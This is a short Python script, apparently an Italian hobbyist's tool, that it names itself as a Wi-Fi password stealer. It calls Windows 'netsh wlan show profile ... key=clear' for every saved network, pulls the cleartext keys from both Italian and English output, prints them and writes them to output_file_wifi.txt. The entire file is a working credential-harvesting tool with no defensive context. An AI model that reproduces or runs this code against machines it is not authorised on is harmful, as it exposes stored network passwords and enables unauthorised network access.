#!/usr/bin/python
import re 
import subprocess,sys

def StealWifiPasswords_mio():
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
    profiles=[]
    for i in data:
        if "Tutti i profili utente" in i:
            profile=i.split(":")[1][1:-1]
            profiles.append(profile)
        elif "All User Profile" in i:
            profile=i.split(":")[1][1:-1]
            profiles.append(profile)

    lunghezza=len(profiles)
    print(lunghezza)
    c=0 
    for i in profiles:
        try:
            Results=[]
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
            for b in results:
                if "Contenuto chiave" in b:
                    results=b.split(":")[1][1:-1]
                    Results.append(results)
                elif "Key Content" in b:
                    results=b.split(":")[1][1:-1]
                    Results.append(results)
            try:
	            print ("Nome rete wifi: {:<30} | Password wifi: {:<}".format(i, Results[0]))
	            with open("output_file_wifi.txt", "a+") as file:
	            	file.write(str("Nome rete wifi: {:<30} | Password wifi: {:<}".format(i, Results[0])))
	            	file.write("\n")
	            c=c+1
	            if(c==lunghezza):
	            	sys.exit(0)
            
            except IndexError:
	            print ("{:<30}|  {:<}".format(i, ""))
        
        except subprocess.CalledProcessError:
	        print ("{:<30}|  {:<}".format(i, "ENCODING ERROR"))
	        with open("output_file_wifi.txt", "w") as file:
	        	file.write("{:<30}|  {:<}".format(i, "ENCODING ERROR"))
	        	file.write("\n")
    
    input("")



StealWifiPasswords_mio()